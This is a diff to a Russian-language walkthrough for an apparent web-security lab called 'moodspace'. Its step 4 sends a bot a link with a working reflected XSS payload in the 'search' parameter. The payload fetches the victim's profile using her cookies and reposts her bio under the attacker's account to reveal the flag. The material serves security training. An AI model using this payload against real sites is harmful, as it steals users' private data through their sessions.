@@ -88,10 +88,10 @@
 
 1. Зайдите в приложение с помощью браузера: http://moodspace.local:5000
 2. Создайте нового пользователя: придумайте имя и пароль. Зарегистрируйтесь и войдите в систему под этими учетными данными.
-3. Найдите скрытый тестовый поддомен.
+3. Найдите уязвимость в строке поиска и скрытый тестовый поддомен.
 4. Отправьте боту Эмме через форму сообщений следующую ссылку (замените *ваш_логин* на свой логин):
    ```bash
-   http://test.moodspace.local:5000/?vuln_param=<script>fetch('http://moodspace.local:5000/api/user/emma',{credentials:'include'}).then(r=>r.json()).then(data=>{fetch('http://moodspace.local:5000/api/post/create',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:data.bio,username:'ваш_логин'})})})</script>
+   http://test.moodspace.local:5000/?search=<script>fetch('http://moodspace.local:5000/api/user/emma',{credentials:'include'}).then(r=>r.json()).then(data=>{fetch('http://moodspace.local:5000/api/post/create',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:data.bio,username:'ваш_логин'})})})</script>
    ```
 6. Вернитесь на основную страницу (в ваш блог) и обновите её. Там появится новый пост с флагом:
    ```bash
